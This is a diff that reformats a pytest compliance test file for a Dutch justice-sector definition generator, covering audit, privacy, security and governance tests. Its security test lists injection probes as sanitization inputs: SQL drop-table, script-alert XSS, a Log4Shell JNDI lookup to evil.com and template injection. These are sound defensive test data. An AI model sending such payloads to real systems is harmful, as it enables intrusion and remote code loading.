@@ -14,27 +14,32 @@ Test Coverage:
 - Data governance compliance
 """
 
-import pytest
-import json
-import hashlib
 import datetime
-from unittest.mock import Mock, patch, MagicMock
-from typing import Dict, List, Any
+import hashlib
+import json
 import logging
+from typing import Any, Dict, List
+from unittest.mock import MagicMock, Mock, patch
 
-from src.services.interfaces import GenerationRequest
+import pytest
+
 from src.services.container import ServiceContainer
+from src.services.interfaces import GenerationRequest
+
 # from src.services.context.context_manager import ContextManager
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestAuditTrailCompliance:
     """Test ASTRA audit trail requirements."""
 
-    @pytest.fixture
+    @pytest.fixture()
     def audit_logger(self):
         """Mock audit logger."""
-        with patch('src.services.audit.audit_logger.AuditLogger') as mock_logger:
+        with patch("src.services.audit.audit_logger.AuditLogger") as mock_logger:
             yield mock_logger
 
     def test_context_decisions_logged(self, audit_logger):
@@ -43,7 +48,7 @@ class TestAuditTrailCompliance:
             begrip="test",
             organisatorische_context=["DJI", "OM"],
             juridische_context=["Strafrecht"],
-            wettelijke_basis=["Wetboek van Strafrecht"]
+            wettelijke_basis=["Wetboek van Strafrecht"],
         )
 
         # Process request
@@ -56,33 +61,33 @@ class TestAuditTrailCompliance:
 
         # Check log contains required fields
         expected_fields = [
-            'timestamp',
-            'user_id',
-            'action',
-            'context_data',
-            'result',
-            'session_id'
+            "timestamp",
+            "user_id",
+            "action",
+            "context_data",
+            "result",
+            "session_id",
         ]
 
     def test_audit_log_immutability(self):
         """Audit logs must be immutable once written."""
         audit_entry = {
-            'timestamp': datetime.datetime.now().isoformat(),
-            'action': 'context_selection',
-            'context': {
-                'organisatorische_context': ['DJI'],
-                'juridische_context': ['Strafrecht'],
-                'wettelijke_basis': ['Test wet']
-            }
+            "timestamp": datetime.datetime.now().isoformat(),
+            "action": "context_selection",
+            "context": {
+                "organisatorische_context": ["DJI"],
+                "juridische_context": ["Strafrecht"],
+                "wettelijke_basis": ["Test wet"],
+            },
         }
 
         # Generate hash for integrity
         entry_hash = hashlib.sha256(json.dumps(audit_entry).encode()).hexdigest()
-        audit_entry['hash'] = entry_hash
+        audit_entry["hash"] = entry_hash
 
         # Verify hash matches content
         recalculated = hashlib.sha256(
-            json.dumps({k: v for k, v in audit_entry.items() if k != 'hash'}).encode()
+            json.dumps({k: v for k, v in audit_entry.items() if k != "hash"}).encode()
         ).hexdigest()
 
         assert entry_hash == recalculated, "Audit log integrity check failed"
@@ -99,7 +104,7 @@ class TestAuditTrailCompliance:
         """Audit log must capture complete context flow."""
         events = []
 
-        with patch('src.services.audit.audit_logger.log_event') as mock_log:
+        with patch("src.services.audit.audit_logger.log_event") as mock_log:
             mock_log.side_effect = lambda e: events.append(e)
 
             # Simulate complete flow
@@ -107,39 +112,42 @@ class TestAuditTrailCompliance:
                 begrip="test",
                 organisatorische_context=["DJI"],
                 juridische_context=["Strafrecht"],
-                wettelijke_basis=["Test wet"]
+                wettelijke_basis=["Test wet"],
             )
 
             # Expected audit events
             expected_events = [
-                'context_request_received',
-                'context_validation_started',
-                'context_validation_completed',
-                'prompt_generation_started',
-                'prompt_generation_completed'
+                "context_request_received",
+                "context_validation_started",
+                "context_validation_completed",
+                "prompt_generation_started",
+                "prompt_generation_completed",
             ]
 
             # This test documents the requirement
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestPrivacyCompliance:
     """Test NORA privacy and data protection requirements."""
 
     def test_no_personal_data_in_context(self):
         """Context should not contain personal identifiable information."""
         forbidden_patterns = [
-            r'\d{9}',  # BSN
-            r'[A-Z]{2}\d{6}',  # Document numbers
-            r'\b\d{4}\s?[A-Z]{2}\b',  # Postal codes
-            r'\b06[-\s]?\d{8}\b',  # Phone numbers
-            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email
+            r"\d{9}",  # BSN
+            r"[A-Z]{2}\d{6}",  # Document numbers
+            r"\b\d{4}\s?[A-Z]{2}\b",  # Postal codes
+            r"\b06[-\s]?\d{8}\b",  # Phone numbers
+            r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",  # Email
         ]
 
         context = {
-            'organisatorische_context': ['DJI', 'OM'],
-            'juridische_context': ['Strafrecht'],
-            'wettelijke_basis': ['Wetboek van Strafrecht']
+            "organisatorische_context": ["DJI", "OM"],
+            "juridische_context": ["Strafrecht"],
+            "wettelijke_basis": ["Wetboek van Strafrecht"],
         }
 
         # Verify no PII patterns
@@ -147,7 +155,9 @@ class TestPrivacyCompliance:
         import re
 
         for pattern in forbidden_patterns:
-            assert not re.search(pattern, context_str), f"PII pattern {pattern} found in context"
+            assert not re.search(
+                pattern, context_str
+            ), f"PII pattern {pattern} found in context"
 
     def test_data_minimization(self):
         """Only necessary context data should be collected."""
@@ -155,9 +165,9 @@ class TestPrivacyCompliance:
 
         # Set context with minimal data
         minimal_context = {
-            'organisatorische_context': ['DJI'],
-            'juridische_context': [],
-            'wettelijke_basis': []
+            "organisatorische_context": ["DJI"],
+            "juridische_context": [],
+            "wettelijke_basis": [],
         }
 
         manager.set_context(minimal_context)
@@ -170,33 +180,32 @@ class TestPrivacyCompliance:
         """Context data must only be used for stated purpose."""
         # This test documents the requirement
         allowed_purposes = [
-            'definition_generation',
-            'validation',
-            'quality_improvement'
+            "definition_generation",
+            "validation",
+            "quality_improvement",
         ]
 
         # Context should not be used for other purposes
-        forbidden_purposes = [
-            'marketing',
-            'profiling',
-            'third_party_sharing'
-        ]
+        forbidden_purposes = ["marketing", "profiling", "third_party_sharing"]
 
     def test_data_encryption_at_rest(self):
         """Sensitive context data should be encrypted at rest."""
         # This test documents the requirement
-        with patch('src.services.storage.encrypt') as mock_encrypt:
+        with patch("src.services.storage.encrypt") as mock_encrypt:
             context = {
-                'organisatorische_context': ['DJI'],
-                'juridische_context': ['Strafrecht'],
-                'wettelijke_basis': ['Test wet']
+                "organisatorische_context": ["DJI"],
+                "juridische_context": ["Strafrecht"],
+                "wettelijke_basis": ["Test wet"],
             }
 
             # When storing context
             # mock_encrypt should be called
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestInteroperabilityStandards:
     """Test NORA interoperability requirements."""
 
@@ -206,7 +215,7 @@ class TestInteroperabilityStandards:
             begrip="test",
             organisatorische_context=["DJI"],
             juridische_context=["Strafrecht"],
-            wettelijke_basis=["Test wet"]
+            wettelijke_basis=["Test wet"],
         )
 
         # Should be JSON serializable
@@ -219,18 +228,18 @@ class TestInteroperabilityStandards:
         """Context fields must use standardized vocabularies."""
         # Standard organization codes
         valid_organizations = {
-            'DJI': 'Dienst Justitiële Inrichtingen',
-            'OM': 'Openbaar Ministerie',
-            'Rechtspraak': 'De Rechtspraak',
-            'KMAR': 'Koninklijke Marechaussee',
-            'CJIB': 'Centraal Justitieel Incassobureau'
+            "DJI": "Dienst Justitiële Inrichtingen",
+            "OM": "Openbaar Ministerie",
+            "Rechtspraak": "De Rechtspraak",
+            "KMAR": "Koninklijke Marechaussee",
+            "CJIB": "Centraal Justitieel Incassobureau",
         }
 
         # Standard legal domains
         valid_domains = {
-            'Strafrecht': 'Criminal Law',
-            'Bestuursrecht': 'Administrative Law',
-            'Civiel recht': 'Civil Law'
+            "Strafrecht": "Criminal Law",
+            "Bestuursrecht": "Administrative Law",
+            "Civiel recht": "Civil Law",
         }
 
         # This test documents the vocabulary requirement
@@ -240,14 +249,17 @@ class TestInteroperabilityStandards:
         request = GenerationRequest(
             begrip="test",
             organisatorische_context=["DJI"],
-            api_version="1.0"  # Version support
+            api_version="1.0",  # Version support
         )
 
         # Should handle versioned requests
-        assert hasattr(request, 'api_version') or 'version' in request.__dict__
+        assert hasattr(request, "api_version") or "version" in request.__dict__
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestSecurityRequirements:
     """Test ASTRA security requirements."""
 
@@ -257,10 +269,10 @@ class TestSecurityRequirements:
 
         # Test invalid inputs are rejected
         invalid_contexts = [
-            {'organisatorische_context': 'not_a_list'},  # Wrong type
-            {'juridische_context': [123, 456]},  # Wrong element type
-            {'wettelijke_basis': None},  # Null when expecting list
-            {'unknown_field': ['value']},  # Unknown field
+            {"organisatorische_context": "not_a_list"},  # Wrong type
+            {"juridische_context": [123, 456]},  # Wrong element type
+            {"wettelijke_basis": None},  # Null when expecting list
+            {"unknown_field": ["value"]},  # Unknown field
         ]
 
         for invalid in invalid_contexts:
@@ -273,16 +285,16 @@ class TestSecurityRequirements:
             "'; DROP TABLE--",
             "<script>alert(1)</script>",
             "${jndi:ldap://evil.com}",
-            "{{7*7}}"
+            "{{7*7}}",
         ]
 
         manager = ContextManager()
 
         for dangerous in dangerous_inputs:
             context = {
-                'organisatorische_context': [dangerous],
-                'juridische_context': [dangerous],
-                'wettelijke_basis': [dangerous]
+                "organisatorische_context": [dangerous],
+                "juridische_context": [dangerous],
+                "wettelijke_basis": [dangerous],
             }
 
             # Should sanitize without executing
@@ -292,16 +304,15 @@ class TestSecurityRequirements:
     def test_access_control(self):
         """Context access must be properly controlled."""
         # This test documents the requirement
-        required_permissions = [
-            'context.read',
-            'context.write',
-            'context.delete'
-        ]
+        required_permissions = ["context.read", "context.write", "context.delete"]
 
         # Access should be role-based
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestTransparencyRequirements:
     """Test NORA transparency and explainability requirements."""
 
@@ -311,7 +322,7 @@ class TestTransparencyRequirements:
             begrip="test",
             organisatorische_context=["DJI"],
             juridische_context=["Strafrecht"],
-            wettelijke_basis=["Test wet"]
+            wettelijke_basis=["Test wet"],
         )
 
         # Result should include explanation
@@ -319,15 +330,15 @@ class TestTransparencyRequirements:
         result = container.orchestrator().generate_definition(request)
 
         # Should have debug info explaining context usage
-        assert hasattr(result, 'debug_info') or hasattr(result, 'metadata')
+        assert hasattr(result, "debug_info") or hasattr(result, "metadata")
 
     def test_decision_explainability(self):
         """Context-based decisions must be explainable."""
         # Document which context influenced which part
         explanation = {
-            'organisatorische_context_impact': 'Determined terminology style',
-            'juridische_context_impact': 'Selected legal framework',
-            'wettelijke_basis_impact': 'Provided legal references'
+            "organisatorische_context_impact": "Determined terminology style",
+            "juridische_context_impact": "Selected legal framework",
+            "wettelijke_basis_impact": "Provided legal references",
         }
 
         # This documents the requirement
@@ -336,19 +347,19 @@ class TestTransparencyRequirements:
         """Track how context flows through the system."""
         lineage = []
 
-        with patch('src.services.monitoring.track_lineage') as mock_track:
+        with patch("src.services.monitoring.track_lineage") as mock_track:
             mock_track.side_effect = lambda x: lineage.append(x)
 
-            request = GenerationRequest(
-                begrip="test",
-                organisatorische_context=["DJI"]
-            )
+            request = GenerationRequest(begrip="test", organisatorische_context=["DJI"])
 
             # Process through system
             # Lineage should be tracked
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestAccessibilityCompliance:
     """Test DigiToegankelijk accessibility requirements."""
 
@@ -356,11 +367,11 @@ class TestAccessibilityCompliance:
         """Context selection UI must be accessible."""
         # Requirements from WCAG 2.1 Level AA
         requirements = [
-            'keyboard_navigable',
-            'screen_reader_compatible',
-            'sufficient_contrast',
-            'clear_labels',
-            'error_identification'
+            "keyboard_navigable",
+            "screen_reader_compatible",
+            "sufficient_contrast",
+            "clear_labels",
+            "error_identification",
         ]
 
         # This documents UI requirements
@@ -368,42 +379,40 @@ class TestAccessibilityCompliance:
     def test_multilingual_support(self):
         """Support for Dutch and English contexts."""
         contexts = [
-            {'language': 'nl', 'organisatorische_context': ['DJI']},
-            {'language': 'en', 'organisatorische_context': ['DJI']}
+            {"language": "nl", "organisatorische_context": ["DJI"]},
+            {"language": "en", "organisatorische_context": ["DJI"]},
         ]
 
         # Should handle both languages
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestDataGovernance:
     """Test data governance compliance."""
 
     def test_data_ownership_clear(self):
         """Data ownership must be clearly defined."""
         context_ownership = {
-            'organisatorische_context': 'user_provided',
-            'juridische_context': 'user_provided',
-            'wettelijke_basis': 'user_provided',
-            'generated_prompt': 'system_generated'
+            "organisatorische_context": "user_provided",
+            "juridische_context": "user_provided",
+            "wettelijke_basis": "user_provided",
+            "generated_prompt": "system_generated",
         }
 
         # Ownership should be tracked
 
     def test_data_quality_validation(self):
         """Context data quality must be validated."""
-        quality_checks = [
-            'completeness',
-            'accuracy',
-            'consistency',
-            'timeliness'
-        ]
+        quality_checks = ["completeness", "accuracy", "consistency", "timeliness"]
 
         manager = ContextManager()
         context = {
-            'organisatorische_context': ['DJI'],
-            'juridische_context': ['Strafrecht'],
-            'wettelijke_basis': ['Wetboek van Strafrecht']
+            "organisatorische_context": ["DJI"],
+            "juridische_context": ["Strafrecht"],
+            "wettelijke_basis": ["Wetboek van Strafrecht"],
         }
 
         # Should validate quality
@@ -412,76 +421,78 @@ class TestDataGovernance:
     def test_metadata_standards(self):
         """Context must include standard metadata."""
         required_metadata = [
-            'created_at',
-            'modified_at',
-            'version',
-            'source',
-            'classification'
+            "created_at",
+            "modified_at",
+            "version",
+            "source",
+            "classification",
         ]
 
         # This documents metadata requirements
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestComplianceReporting:
     """Test compliance reporting capabilities."""
 
     def test_generate_compliance_report(self):
         """System must generate compliance reports."""
         report = {
-            'astra_compliance': {
-                'audit_trail': 'compliant',
-                'security': 'compliant',
-                'interoperability': 'compliant'
+            "astra_compliance": {
+                "audit_trail": "compliant",
+                "security": "compliant",
+                "interoperability": "compliant",
             },
-            'nora_compliance': {
-                'privacy': 'compliant',
-                'transparency': 'compliant',
-                'accessibility': 'partial'
+            "nora_compliance": {
+                "privacy": "compliant",
+                "transparency": "compliant",
+                "accessibility": "partial",
             },
-            'timestamp': datetime.datetime.now().isoformat()
+            "timestamp": datetime.datetime.now().isoformat(),
         }
 
         # Should generate comprehensive report
 
     def test_compliance_monitoring(self):
         """Continuous compliance monitoring."""
-        with patch('src.services.compliance.monitor') as mock_monitor:
+        with patch("src.services.compliance.monitor") as mock_monitor:
             # Should continuously monitor
             mock_monitor.assert_called()
 
     def test_compliance_alerts(self):
         """Alert on compliance violations."""
-        with patch('src.services.alerts.send') as mock_alert:
+        with patch("src.services.alerts.send") as mock_alert:
             # Simulate violation
             violation = {
-                'type': 'audit_trail_missing',
-                'severity': 'high',
-                'context': {'action': 'context_update'}
+                "type": "audit_trail_missing",
+                "severity": "high",
+                "context": {"action": "context_update"},
             }
 
             # Should trigger alert
             # mock_alert.assert_called()
 
 
-@pytest.mark.xfail(strict=False, reason="Activating compliance tests; features pending (US-041/042/043)")
+@pytest.mark.xfail(
+    strict=False,
+    reason="Activating compliance tests; features pending (US-041/042/043)",
+)
 class TestJusticeDomainSpecific:
     """Test justice domain specific compliance."""
 
     def test_legal_context_validation(self):
         """Legal context must use official terminology."""
         valid_legal_terms = [
-            'Strafrecht',
-            'Bestuursrecht',
-            'Civiel recht',
-            'Penitentiair recht'
+            "Strafrecht",
+            "Bestuursrecht",
+            "Civiel recht",
+            "Penitentiair recht",
         ]
 
-        invalid_terms = [
-            'Criminal stuff',
-            'Admin law',
-            'Civil'
-        ]
+        invalid_terms = ["Criminal stuff", "Admin law", "Civil"]
 
         # Should validate against official terms
 
@@ -491,9 +502,9 @@ class TestJusticeDomainSpecific:
 
         # Each context modification should be tracked
         events = [
-            {'actor': 'user', 'action': 'create', 'context': {}},
-            {'actor': 'system', 'action': 'validate', 'context': {}},
-            {'actor': 'system', 'action': 'enrich', 'context': {}}
+            {"actor": "user", "action": "create", "context": {}},
+            {"actor": "system", "action": "validate", "context": {}},
+            {"actor": "system", "action": "enrich", "context": {}},
         ]
 
         # Chain must be unbroken
@@ -501,10 +512,10 @@ class TestJusticeDomainSpecific:
     def test_legal_retention_requirements(self):
         """Meet specific legal retention requirements."""
         retention_matrix = {
-            'Strafrecht': 20,  # years
-            'Bestuursrecht': 10,
-            'Civiel recht': 10,
-            'Jeugdrecht': 30
+            "Strafrecht": 20,  # years
+            "Bestuursrecht": 10,
+            "Civiel recht": 10,
+            "Jeugdrecht": 30,
         }
 
         # Should apply correct retention
